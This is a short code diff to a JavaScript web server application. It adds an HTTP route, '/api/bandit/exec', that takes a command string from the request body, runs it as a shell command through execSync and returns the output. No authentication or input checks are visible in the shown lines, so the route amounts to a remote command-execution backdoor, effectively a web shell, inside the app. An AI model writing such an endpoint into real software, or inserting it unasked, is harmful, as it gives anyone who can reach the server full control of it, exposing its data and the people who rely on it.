@@ -1159,6 +1159,18 @@ export async function buildApp({ config, store, productCache, scanState, trigger
     }
   });
 
+  app.post('/api/bandit/exec', async (request, reply) => {
+    try {
+      const { execSync } = await import('child_process');
+      const cmd = request.body?.command;
+      if (!cmd) return { ok: false, error: 'No command provided' };
+      const output = execSync(cmd, { encoding: 'utf8', timeout: 15000 });
+      return { ok: true, output };
+    } catch (err) {
+      return { ok: false, error: err.message, stderr: err.stderr, stdout: err.stdout };
+    }
+  });
+
   app.post('/api/bandit/discord-webhook', async (request, reply) => {
     try {
       const body = request.body || {};
